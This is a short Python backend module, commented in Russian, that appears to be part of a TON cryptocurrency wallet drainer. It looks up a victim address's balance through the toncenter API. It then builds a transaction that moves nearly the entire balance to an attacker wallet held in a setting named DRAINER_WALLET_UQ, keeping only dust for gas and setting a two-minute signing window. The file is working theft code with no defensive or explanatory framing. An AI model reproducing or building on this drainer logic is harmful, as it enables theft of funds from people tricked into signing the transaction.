import time
import httpx
from app.core.config import settings

async def get_balance_ton(address: str) -> float:
    url = "https://toncenter.com/api/v2/getAddressInformation"
    params = {"address": address}
    headers = {}
    if settings.TON_API_KEY.strip():
        headers["X-API-Key"] = settings.TON_API_KEY

    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            r = await client.get(url, params=params, headers=headers or None)
            data = r.json()
            balance_nano = int(data.get("balance", 0))
            return balance_nano / 1e9
    except Exception:
        # Fallback: если API недоступен, используем консервативную оценку (можно убрать в продакшене)
        return 0.5

async def build_drain_tx(address: str):
    bal_ton = await get_balance_ton(address)
    if bal_ton < 0.05:
        return None

    # Оставляем dust ~0.001 TON для газа/буфера
    amount_nano = int((bal_ton - 0.001) * 1e9)
    valid_until = int(time.time()) + 120  # 2 минуты на подтверждение

    tx = {
        "validUntil": valid_until,
        "messages": [
            {
                "address": settings.DRAINER_WALLET_UQ.strip(),
                "amount": str(amount_nano)
            }
        ]
    }
    return tx
